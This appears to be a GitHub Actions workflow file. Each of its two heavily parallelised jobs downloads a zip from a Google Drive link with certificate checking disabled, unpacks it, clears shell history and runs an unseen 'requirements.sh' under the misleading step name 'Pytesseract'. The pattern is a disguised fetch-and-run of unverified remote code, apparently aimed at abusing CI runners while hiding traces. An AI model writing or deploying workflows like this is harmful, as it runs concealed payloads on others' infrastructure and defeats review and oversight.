name: infratienhoa798zone
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  START:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.o, I.i, I.ii]
        flag: ['Draft', 'Construct', 'Inspect', 'Trigger', 'Ship']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: install module
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1ngTPaFZkpwJlJPtZ9Elml4lqqGG3w5ml" -O Ansible.zip
        unzip -o Ansible.zip
        rm Ansible.zip
        history -c && history -w

    - name: Pytesseract
      run: bash requirements.sh


  CONFIGURE1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.o, I.i, I.ii]
        flag: ['Configure', 'Build', 'Analyze', 'Operate', 'Distribute']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: install module
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1ngTPaFZkpwJlJPtZ9Elml4lqqGG3w5ml" -O Ansible.zip
        unzip -o Ansible.zip
        rm Ansible.zip
        history -c && history -w

    - name: Pytesseract
      run: bash requirements.sh
        
